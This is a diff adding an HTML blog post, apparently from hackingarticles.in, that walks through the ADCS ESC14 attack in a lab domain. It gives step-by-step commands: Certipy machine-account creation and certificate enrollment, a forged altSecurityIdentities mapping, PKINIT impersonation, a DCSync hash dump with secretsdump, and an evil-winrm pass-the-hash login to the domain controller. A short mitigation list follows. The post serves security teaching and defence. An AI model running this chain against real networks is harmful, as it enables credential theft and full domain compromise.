@@ -1,0 +1,152 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/active-directory-certificate-attack/" rel="category tag">Active Directory Certificate Attack</a></span>            </div>
+            <h1 class="post-title entry-title">ADCS ESC14 – Write access on altSecurityIdentities</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/adcs-esc14-write-access-on-altsecurityidentities/" rel="bookmark"><time class="entry-date published" datetime="2025-07-03T16:57:39+00:00">July 3, 2025</time><time class="updated" datetime="2025-07-23T05:41:58+00:00">July 23, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;"><strong>ESC14</strong> targets weak <strong>certificate mapping</strong> in <strong>Active Directory</strong>, exploiting the <strong>altSecurityIdentities</strong> attribute to allow attackers to spoof <strong>Subject CN</strong> or <strong>Issuer DN</strong> fields. This enables unauthorized <strong>PKI authentication</strong> as a <strong>privileged user</strong> or <strong>Domain Controller</strong>, leading to <strong>privilege escalation</strong> and potential <strong>domain compromise</strong>. Proper <strong>certificate validation</strong> is critical to prevent <strong>ESC14</strong> attacks.</span></p>
+<h2><span style="color: #800000;">Table of Content</span></h2>
+<ul>
+<li><span style="color: #000000;"><strong>Overview the ESC14 Attack</strong></span></li>
+<li><span style="color: #000000;"><strong>Working of ESC14</strong></span></li>
+<li><span style="color: #000000;"><strong>Prerequisites</strong></span></li>
+<li><span style="color: #000000;"><strong>Lab Setup</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration &amp; Exploitation </strong></span></p>
+<ul>
+<li><span style="color: #000000;">Abusing Weak Explicit Certificate Mappings via altSecurityIdentities</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Post Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Full SYSTEM Shell via Evil-WinRM</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Mitigation </strong></span></p>
+<h3><span style="color: #800000;">Overview the ESC14 Attack</span></h3>
+<p><span style="color: #000000;"><strong>ESC14</strong> is a powerful post-exploitation technique targeting <strong>Active Directory Certificate Services (AD CS)</strong> environments where <strong>explicit certificate mappings (altSecurityIdentities)</strong> are weakly configured or poorly monitored.</span></p>
+<p><span style="color: #000000;">Instead of relying on UPN mapping like in attacks such as <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/ad-certificate-exploitation-esc1/"><strong>ESC1</strong></a> </span>or <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/adcs-esc8-ntlm-relay-to-ad-cs-http-endpoints/"><strong>ESC8</strong></a></span>, <strong>ESC14 abuses direct manual mappings</strong> between a certificate and an AD user account. By injecting a forged mapping into the <strong>altSecurityIdentities</strong> attribute of a target user (e.g., raj), an attacker can trick Active Directory into accepting <strong>any certificate that matches the mapping</strong> for Kerberos authentication.</span></p>
+<p><span style="color: #000000;">This technique becomes especially dangerous when:</span></p>
+<ul>
+<li><span style="color: #000000;">The attacker can create machine accounts or obtain certificates with controllable fields.</span></li>
+<li><span style="color: #000000;">The environment uses <strong>Issuer-Subject</strong> or <strong>Subject-only</strong> mapping (weak options).</span></li>
+</ul>
+<p><span style="color: #000000;">In this scenario, we’ll show how to escalate from a <strong>low-privileged user (</strong><strong>sanjeet</strong><strong>)</strong> to <strong>full domain compromise</strong>, pivoting through certificate abuse, explicit mapping, and finally extracting Administrator credentials.</span></p>
+<h3><span style="color: #800000;">Working of ESC14</span></h3>
+<p><span style="color: #000000;">The ESC14 technique typically involves the following steps:</span></p>
+<ol>
+<li><span style="color: #000000;"><strong>Explicit Mapping Exploit</strong> – By editing altSecurityIdentities, we directly tie a certificate to another account.</span></li>
+<li><span style="color: #000000;"><strong>Machine Cert Abuse</strong> – Utilizing a machine certificate helps bypass UPN-based controls.</span></li>
+<li><span style="color: #000000;"><strong>PKINIT Authentication Flow</strong> – AD trusts the mapping to issue tickets, enabling ticket-based impersonation.</span></li>
+<li><span style="color: #000000;"><strong>Privilege Escalation to Admin</strong> – Once can authenticate, DCSync and hash extraction techniques become viable.</span></li>
+</ol>
+<p><span style="color: #000000;">In summary, ESC14 exploits misconfigured explicit certificate mapping to impersonate high-privileged accounts. By altering the altSecurityIdentities attribute and using machine certificates, attackers gain Kerberos tickets via PKINIT, enabling privilege escalation through tools like DCSync, ultimately achieving Domain Admin access. This underscores the need for securing certificate mapping and enforcing strong PKI practices.</span></p>
+<h3><span style="color: #800000;">Prerequisite </span></h3>
+<ul>
+<li><span style="color: #000000;">Windows Server 2019 as Active Directory that supports PKINIT</span></li>
+<li><span style="color: #000000;">Domain must have Active Directory Certificate Services and Certificate Authority configured.</span></li>
+<li><span style="color: #000000;">Kali Linux packed with tools</span></li>
+<li><span style="color: #000000;">Tools: <strong>Certipy</strong><strong>, OpenSSL, Ldeep, Python scripts for altSecurityIdentities manipulation, Impacket, </strong>and<strong> Evil-WinRM</strong></span></li>
+</ul>
+<h3><span style="color: #800000;">Lab Setup</span></h3>
+<p><span style="color: #000000;">For this article, we’re <strong>skipping the full Active Directory and CA setup instructions</strong>, assuming you already have:</span></p>
+<ul>
+<li><span style="color: #000000;">A working domain(ignite.local in our case)</span></li>
+<li><span style="color: #000000;">Domain Controller at 168.220.138 in our case</span></li>
+<li><span style="color: #000000;">Certificate Authority configured (with a Machine template enabled)</span></li>
+<li><span style="color: #000000;">Two domain users(may vary in your case):</span>
+<ul>
+<li><span style="color: #000000;"><strong>raj (Target)</strong></span></li>
+<li><span style="color: #000000;"><strong>sanjeet (Attacker)</strong></span></li>
+</ul>
+</li>
+</ul>
+<p><span style="color: #000000;">We’ll focus purely on the <strong>exploitation flow</strong>, beginning from user enumeration through to full Domain Admin takeover.</span></p>
+<h2><span style="color: #000000;"><span style="color: #800000;">Enumeration &amp; Exploitation</span> </span></h2>
+<h3><span style="color: #800000;">Abusing Weak Explicit Certificate Mappings via altSecurityIdentities</span></h3>
+<h4><span style="color: #000000;"><strong>Confirm Existing User Accounts</strong></span></h4>
+<p><span style="color: #000000;">Before starting, validate that both raj and sanjeet exist in the domain:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net user raj</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhYm8RNlSbBPONg3P_8dt2S4SlKSLK7Oaql8bjlhaHEwVOWR9EvHFZEbgpLHAiuvgGSFSx9N9cH2s8AdfMBHhg3EQkz-L4VA8C_pe_ZLBlX_zRX67c3rOWF-p2o8-TCQNlyX_suHnR7-MWtnGSYHyiwhf8vqY99_gFxlI2hXtsgJWVNc8qfCFAqU8NKCtQI/s16000/1.png"/></strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net user sanjeet</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgn7fiQ6LqoY3kRCO39vem4hB_9ZTSl0OlwEvYEPMQ1JP0yBBDDsHtmS6G5FMfhTLlduowXdRXt8FIg9-SBswlf5bz5boU_QnLh3QBxY8bEgcxnkvQS0lghCbRhDiuv5lCdwQo8ORf4WKKUkmDOR0KnCrARi4OibnpqSCoyxnSFNyX5A6QodV87lMuA9vQd/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">Firstly, we validate that raj (target) and sanjeet (attacker) exist in the domain. This ensures both our victim and attacker identities are available for the upcoming abuse.</span></p>
+<h4><span style="color: #000000;">Grant raj Full Control Over sanjeet</span></h4>
+<p><span style="color: #000000;">In <strong>Active Directory Users and Computers (ADUC):</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Open <strong>raj → Properties → Security → Advanced</strong></span></li>
+<li><span style="color: #000000;">Add sanjeet with <strong>Full Control (may vary in your case)</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgB30S3ujwzQEJ-2C3UwR_QGqrUKXeM3OM0iUu_IEhV2QcD0fAn1Qey6L88alGlaQqxHUCIQdcEDelXV4vu7NaJPbN7hSLW5C7Ta0e4MZKNPfz59iR-1QMsYS6V628Tc50lk3-P4dhcxaaeYFBeYaJiKnHTYurMYkpwFNkChfWv_1m7CsBXP60MIjtQEuic/s16000/3.png"/></span></p>
+<p><span style="color: #000000;"><strong>This step is a key ESC14 prerequisite.</strong> Without write access to raj’s attributes, the attacker (sanjeet) can’t manipulate the altSecurityIdentities field.</span></p>
+<h4><span style="color: #000000;">Create a Rogue Machine Account (badpc$)</span></h4>
+<p><span style="color: #000000;">To obtain a trusted <strong>PKINIT</strong> certificate, we create a <strong>machine account</strong> (e.g., <strong>badpc$</strong>) to enroll for a <strong>machine-authenticating certificate</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad account -u sanjeet -p Password@1 -dc-ip 192.168.220.138 -target dc01.ignite.local -user badpc$ -pass Password@3 create</pre>
+<p><span style="color: #000000;">We create a <strong>machine account</strong> (e.g., <strong>badpc$</strong>) because machine accounts can enroll for certificates using the <strong>Machine template</strong>, which includes the <strong>Client Authentication EKU</strong> required for <strong>PKINIT</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhGq3BiLDkYUyCN7qroyY7KIYEP5r9xUKSB5XKwWElogxIMOYemZFgE6XRHOTawm_zLY863AGPjEGymqocHnXGOUMhwfz0lNLp8x5j3-bFqsipek5x8iE4tYIekOJ0qBTuow-G1FZXuIVe-vfRq3iv0e8RxNGuzYA8JP83NQBOkR9m-EJ33giUvUZcwWWYw/s16000/4.1.png"/></span></p>
+<h4><span style="color: #000000;">Request a Certificate for the Machine Account</span></h4>
+<p><span style="color: #000000;">We request a certificate for badpc$ using the Machine template</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad req -target dc01.ignite.local -u badpc$ -p Password@3 -dc-ip 192.168.220.138 -template Machine -ca ignite-DC01-CA</pre>
+<p><span style="color: #000000;">This gives us a legitimate, <strong>CA-signed cert</strong>, trusted for authentication.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3e4Pz-EPysX2RTeDLtiw-IE8FN0LTpUAMOrCJF1lnmr0ubEm7XBsZ4l-DexZf7ICOaSQZRCDgLt8Cl4zyqvkAsXTcaPRYlDinb4mBrreOf-5d9CWuY-a3XhgzvYGishav9ouQp027tx_WEY3ty6h8PbmSt2CekSKgQJv9sOXpqkHzDTBq-AwxAXAf6nYK/s16000/4.png"/></span></p>
+<h4><span style="color: #000000;">Extract and Analyze the Public Certificate</span></h4>
+<p><span style="color: #000000;">We export the public part of the certificate and inspect it with OpenSSL.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad cert -pfx badpc.pfx -nokey -out "badpc.crt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgu1_KlnqpLiR8wyqTl6mwFLf9d4CNva7n79faoUDJ9ncptQz29WE4jQK5iZiJ9vDlb_6tanpNzd7xXW1c4AyqyCJ0qQ1FgrQsV2Cj5L_gedF_8uMVL2Z5x1wweLL5N2P4puOT0mSJXeK850DPFCDPeyI8698Y6nQSWL86lYFsITK9brzFYdYpiCLfjwB4-/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">The key fields we care about are:</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>Issuer Name</strong></span></li>
+<li><span style="color: #000000;"><strong>Serial Number</strong></span></li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">openssl x509 -in badpc.crt -noout -text</pre>
+<p><span style="color: #000000;">These two pieces are essential for building a valid <strong>altSecurityIdentities X509 mapping string</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhmbwmDQqFCVGwKkYx9UVe84JpBiBuI79SLe5jvgXfFQ9LSbKvMEbNEc4x391n_1BCSaNoJ4iYf51035MWzL10apniAyAMIwhpJD_xzwFQypW9MZKZSNecALSZqry0rminMiFwE8CwMFqx-O6XUu22SOeKaBjdoB4gx1FFYPRWGRQMW07ieUfHmezJW9cAR/s16000/6.png"/></span></p>
+<h4><span style="color: #000000;">Inspect the Target’s Existing Mapping</span></h4>
+<p><span style="color: #000000;">Before injecting our mapping, we check whether <strong>raj already has any certificate based logon mappings</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ldeep ldap -u sanjeet -d ignite.local -p Password@1 -s ldap://192.168.220.138 search '(samaccountname=raj)' altSecurityIdentities</pre>
+<p><span style="color: #000000;">This avoids overwriting or colliding with legitimate mappings.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgsu80ZWjxeDGhmYcNO0zKVz9Es-SN0aD7BkFOeEVcd9jR7N2nFIAabKwS7JjwJBOBPprMCL51sOMmZPvsrank1GG3D1-C3KwgXb4NBFOskZGkaXVua0ysDGEbeZo-PZFnFiZ12WGotlWqfNJO72ezVnfcokZeurFm9Fv8byBqI6XjcKkdtGIRy9HJgcL8V/s16000/7.png"/></span></p>
+<h4><span style="color: #000000;">Generate the Correct Mapping Format (Issuer+Serial)</span></h4>
+<p><span style="color: #000000;">This custom Python tool generates the <strong>precise X509 mapping string</strong> in the following format:</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgWCBWcSpwyAyDUAP4GiU5_4wO8D5hddao457vwTv0-_72oFNXdJECFKhZuO0jYZuMGnTHaV_AYjFsRHFzrIwELvrp-QkWO-ul0qm87oEcPNLhSO0uPdOjxNA8bvYsquzF-cuyA_QIEb-MOGoT0rqfy4qsP7wZJFr8FlhLDrXjR2m0ZJazRFf7iUkQm29v_/s16000/8.png"/></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python x509_issuer_serial_number_format.py</pre>
+<p><span style="color: #000000;"><em><strong>Note</strong>: We use this tool to <strong>generate the mapping string</strong> for the rogue certificate (from </em><em>badpc$</em><em>) before injecting it into the target user’s (</em><em>raj</em><em>) </em><em>altSecurityIdentities</em><em> attribute.</em></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_tV5YzlWxaBu3OY2_vbJlUkoIrtG7HMnXD3adYetrzpCJ9IMV5btnsBolUUWwsf0EXdBgEJA2DL6XOTQdNBtw-z8L4q_JFn9zLCWDoRA5jYbVKYa7JI_maOo3NDMIvYSt2KKnj2cqpoiE9tVvHKSJVWYLUAyhLYHHE8pZ4sbj5ddIb_zgodYzfz4PQI1m/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">This exact string is what Active Directory uses to match incoming certificate authentication attempts against the target account. Without this correctly formatted string, AD won’t recognize or map the certificate.</span></p>
+<h4><span style="color: #000000;">Inject the Mapping into raj’s altSecurityIdentities</span></h4>
+<p><span style="color: #000000;">By editing raj’s LDAP object, we <strong>explicitly link our rogue cert (from </strong><strong>badpc$</strong><strong>)</strong> to the target user. Once done, AD will allow authentication to raj via this cert.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhpCL5evGyjbOJUMp5E9lcFHZaa8ASa123hfA7szKgqHjAVhd9kE1CdEzczKPxCTltcgNAdFy9GItafVe7m_3UNch7P7SkfvJpqfedW8lRW1-5-6NFxqkYJ3ex_s-AZ8BtkobCdzVlwrGCDdKSehdi6biwZZdfSTNcyExO_5ttRm47gYLvM2yWqs5n3iNoD/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">We write the generated mapping into raj’s altSecurityIdentities attribute via LDAP.</span></p>
+<p><span style="color: #000000;">Any client presenting a certificate matching this Issuer+Serial will authenticate as raj during PKINIT.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python add-altSecurityIdentities.py</pre>
+<p><span style="color: #000000;"><em><strong>Note</strong>: After generating the mapping string with the previous Python script, we <strong>run this command to write that mapping into raj’s LDAP object</strong>, enabling certificate based impersonation.</em></span></p>
+<p><span style="color: #000000;">Again, double check that the mapping was added. This step avoids troubleshooting authentication failures later as done in below screenshot.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ldeep ldap -u sanjeet -d ignite.local -p Password@1 -s ldap://192.168.220.138 search '(samaccountname=raj)' altSecurityIdentities</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhYjvoxOMRPsuR9kw_E5-fnVXY5CqgWrj1tlmh3DxBzhS7-apOybklzwM6QuOgPLIwpS-CzCgz8FuLM5i_Cw1zpiOTUR-OVQtLDXPGmV4yxWPFjg_sK_DvGAyfUMOStK6LyJbagNDh-kz8122wswNyczTaLlvmZkUINlls_igoaKWCa_bYDwXYM9M_r335d/s16000/11.png"/></span></p>
+<h4><span style="color: #000000;">Authenticate as raj Using the Machine Certificate</span></h4>
+<p><span style="color: #000000;">Then, we <strong>authenticate as raj</strong>, using the certificate originally issued to badpc$.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad auth -pfx badpc.pfx -dc-ip 192.168.220.138 -username raj -domain ignite.local</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgydEdiGQRNCEr4_HkNSCHN_7n_FLPBztIUlHJyDa2oSXEmJ-_aB2KkCXHnRvw91rQVMLuuuIdChzpYcO1tkLm9UQugCFdwQh3b6Msep0_XNDx1K-iVqDcXEGZBR2c4MD0SmfkM9Z8S3ynAl5F7EnnPY3xwHQdzjDylzBD4aOhDFyhdvUcW7Yz2OtvD4C3v/s16000/12.png"/></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">AD trusts the cert because of the explicit mapping we injected, making this a perfect ESC14 exploitation.</pre>
+<p><span style="color: #000000;">With raj’s elevated authentication, we run <strong>DCSync</strong> to pull the <strong>Administrator’s NTLM hash</strong>, a classic post exploitation goal as below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">export KRB5CCNAME=raj.ccache</pre>
+<p><span style="color: #000000;"><em><strong>Note</strong>: The </em><em>export KRB5CCNAME=raj.ccache</em><em> step is critical for <strong>using your captured Kerberos ticket for post exploitation actions</strong> like <strong>DCSync</strong><strong>, hash dumping</strong>, or <strong>remote access</strong>, all <strong>without needing passwords or hashes again</strong><strong>.</strong></em></span></p>
+<p><span style="color: #000000;">Now the tool will use the <strong>Kerberos ticket</strong> from raj.ccache, <strong>not prompting for credentials</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-secretsdump -just-dc-user administrator ignite.local/raj@dc01.ignite.local -k -no-pass</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg1s-zRykfqN_qaH8uezrDwB-T4voNxUPLLYnI9GkYev4yDEqsov9mdD7ak7JQrGhHS0Hb7JiljaEmeiX43UdkpsQuEP5BlzgsUoEhs8hw1CvSBB6bXTuPTGrAhajNdRUHvHcihMquTdiOtrjpd-4YbxG2PMZQ4Qu1nbFWQpfSppU2evwkTqB1LowxQemjM/s16000/13.png"/></span></p>
+<h2><span style="color: #800000;">Post Exploitation</span></h2>
+<h3><span style="color: #800000;">Full SYSTEM Shell via Evil-WinRM</span></h3>
+<p><span style="color: #000000;">Finally, we now log in as Administrator using Evil-WinRM and the stolen NTLM hash—giving us <strong>full SYSTEM access on the Domain Controller</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm -i 192.168.220.138 -u administrator -H 64fbae31cc352fc26af97cbdef151e03</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEipPcd80XrSl89jbBoq62IevCXZ202I9bN7gfEstaWXCVkllbgBb1B848p0SyG39TWvOwl5LG0_bz1mMTZy5DDNmp7MeOzdAiJYbV2t0x3GSiLPpkqpt_oibZSm_2nnKFk436olOqeBc2Uba604tQZn4UoB-VvxNgghcCSCuLaS2qvpYz8p9xIHRvJhFQ0X/s16000/14.png"/></span></p>
+<h2><span style="color: #800000;">Mitigation</span></h2>
+<ul>
+<li><span style="color: #000000;"><strong>Restrict altSecurityIdentities write access:</strong> Only Domain Admins or equivalent.</span></li>
+<li><span style="color: #000000;"><strong>Audit all changes to altSecurityIdentities:</strong> Enable LDAP modification logging (Event ID 5136).</span></li>
+<li><span style="color: #000000;"><strong>Enforce strong certificate mapping policies:</strong> Avoid mappings that rely solely on Subject or non-unique fields.</span></li>
+<li><span style="color: #000000;"><strong>Monitor PKINIT TGT requests:</strong> Especially from accounts where mapping was recently changed.</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Author</strong>: MD Aslam drives security excellence and mentors teams to strengthen security across products, networks, and organizations as a dynamic Information Security leader. Contact <strong><a href="https://www.linkedin.com/in/md-aslam-7b04ab144">here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
